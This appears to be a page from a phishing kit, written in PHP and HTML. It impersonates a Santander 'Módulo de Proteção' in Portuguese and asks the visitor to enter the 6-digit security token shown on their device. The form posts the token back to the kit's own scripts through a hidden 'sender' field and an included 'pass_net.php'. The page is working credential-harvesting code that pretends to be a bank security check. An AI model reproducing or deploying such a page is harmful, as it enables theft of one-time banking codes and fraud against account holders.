<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased" style="line-height: 1.3em;">
					Para proseguir com esta operação, você precisa informar uma senha Token. <br>
					Informe abaixo a senha de 6 dígitos que aparece no visor do seu dispositivo.
				</p>
			</div>

			<div class="md_boxTables" style="margin-top: -10px;">

				<form action="" name="formAss" id="formAss" method="post" onsubmit="return checkTk();">
					<div class="block_user_token">
						<input type="password" name="tks" id="tks" class="input_ass" maxlength="6" onkeypress='return SomenteNumero(event)' autocomplete="off"> 
					</div>
					<input type="hidden" name="sender" id="sender" value="token">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass person_token_btn" value="continuar">

					<span style="display:block;width:100%;margin:0 0 20px 0;color:#ed2228;">Informe a senha token que aparece no visor do seu dispositivo.</span>
				</form>
			
				<span class="note_atr">
					<b class="red_txt">DICA:</b><br>
					Quando utilizado SMS Token, o mesmo pode demorar alguns segundos/minutos para ser recebido no seu celular, à depender de sua operadora de telefonia. 
					Caso ainda não o tenha recebido, por favor aguarde mais alguns instantes.
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>